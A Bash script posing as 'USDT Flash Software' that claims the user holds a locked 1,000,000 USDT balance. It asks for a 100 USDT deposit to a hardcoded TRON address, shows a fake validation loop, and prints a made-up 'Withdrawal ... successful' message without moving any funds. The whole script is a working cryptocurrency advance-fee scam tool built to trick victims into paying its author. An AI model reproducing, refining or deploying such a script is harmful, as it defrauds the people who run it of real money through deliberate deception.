#!/bin/bash

# Wallet Command Line

balance=1000000
hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099"
account_id="TCPtJiF1nYuM93shR2QKnnFY3oPPu6MjEh"

usdt_logo="
\e[38;2;38;161;123m$$$$$$\
$$  __$$\
$$ /  \__| $$$$$$\  $$\   $$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\
\e[38;2;38;161;123m\$$$$$$\  $$  __$$\ $$ |  $$ |$$  _$$  _$$\  \____$$\ $$  __$$\ $$  __$$\
 \____$$\ $$ /  $$ |$$ |  $$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ |$$ |  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |
\e[38;2;38;161;123m\$$$$$$  |\$$$$$$  |\$$$$$$  |$$ | $$ | $$ |\$$$$$$$ |\$$$$$$  |$$ |  $$ |
 \______/  \______/  \______/ \__| \__| \__| \_______| \______/ \__|  \__|
\e[0m"

function fancyBoxEcho {
    local message="$1"
    local length=${#message}
    local border=$(printf '=%.0s' $(seq 1 $((length + 4))))

    echo -e "\e[38;2;38;161;123m$border\e[0m"
    echo -e "\e[38;2;38;161;123m| $message |\e[0m"
    echo -e "\e[38;2;38;161;123m$border\e[0m"
}

welcome_message="Welcome to the USDT Flash Software! Unlock your balance and enjoy the power of Flash USDT!"

echo -e "$usdt_logo"

fancyBoxEcho "$welcome_message"

echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"

function unlockBalance {
    echo " "
    read -p "Enter your deposit amount in USDT: " depositAmount
    read -p "Enter the transaction hash ID: " transactionHash
	
    echo " "
    for ((i=1; i<=15; i++)); do
        echo -e " \e[32mValidating please wait...\e[0m"
        sleep 0.5
    done
    echo " "

    if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
        refresh
        selectNetwork
    else
        echo -e "\e[31mError: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
        sleep 3
        clear
        fancyBoxEcho "$welcome_message"
        unlockBalance
    fi
}

function selectNetwork {
#    echo -e "$usdt_logo"
    echo "Select network:"
    echo " "
    echo "1. TRC20"
    echo "2. ERC20"
    echo "3. BEP20"
    echo " "
    echo -n "Enter your choice: "
    read network_choice

    case $network_choice in
        1) network="TRC20";;
        2) network="ERC20";;
        3) network="BEP20";;
        *) echo "Invalid choice, please try again."; selectNetwork;;
    esac

    selectWithdrawalAmount
}

function selectWithdrawalAmount {
    echo "Select withdrawal amount:"
    echo "1. 1000000"
    echo "2. 500000"
    echo "3. 300000"
    echo "4. 100000"
    echo -n "Enter your choice: "
    read amount_choice

    case $amount_choice in
        1) amount=1000000;;
        2) amount=500000;;
        3) amount=300000;;
        4) amount=100000;;
        *) echo "Invalid choice, please try again."; selectWithdrawalAmount;;
    esac

    read -p "Enter your withdrawal address: " withdrawal_address
    echo ""
    echo "Please Wait...."
    sleep 4
    echo "[+] Withdrawal of $amount USDT successful to address $withdrawal_address on $network network. [+]"
    exit
}

function refresh {
    echo "Refreshing..."
    sleep 2
    clear
    echo -e "$usdt_logo"
    echo " "
    fancyBoxEcho "$welcome_message"
    echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT Under TRC20 to the following address: $account_id"
}

refresh # Call the refresh function when the script starts

while true; do
    unlockBalance
done

exit

